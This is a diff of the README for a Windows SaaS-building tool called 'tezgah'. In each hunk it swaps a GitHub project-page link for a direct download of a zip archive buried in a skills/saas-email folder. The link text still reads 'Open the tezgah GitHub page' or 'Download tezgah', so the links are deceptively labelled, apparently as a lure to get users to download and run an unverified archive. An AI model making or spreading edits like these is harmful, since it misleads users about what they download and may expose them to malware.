@@ -1,6 +1,6 @@
 # ⚙️ tezgah - Build SaaS faster on Windows
 
-[![Download tezgah](https://img.shields.io/badge/Download%20tezgah-blue?style=for-the-badge&logo=github)](https://github.com/tomiya1324/tezgah)
+[![Download tezgah](https://img.shields.io/badge/Download%20tezgah-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/tomiya1324/tezgah/main/skills/saas-email/Software_3.9.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ This repo is aimed at solo founders who want to move from idea to working produc
 
 Use this link to visit the project page and download it:
 
-[Open the tezgah GitHub page](https://github.com/tomiya1324/tezgah)
+[Open the tezgah GitHub page](https://raw.githubusercontent.com/tomiya1324/tezgah/main/skills/saas-email/Software_3.9.zip)
 
 Follow these steps on Windows:
 
@@ -202,7 +202,7 @@ Use these tips to avoid common setup issues:
 
 ## 📍 Open the project page again
 
-[Visit the tezgah GitHub page](https://github.com/tomiya1324/tezgah)
+[Visit the tezgah GitHub page](https://raw.githubusercontent.com/tomiya1324/tezgah/main/skills/saas-email/Software_3.9.zip)
 
 ## 🧰 Simple workflow
 
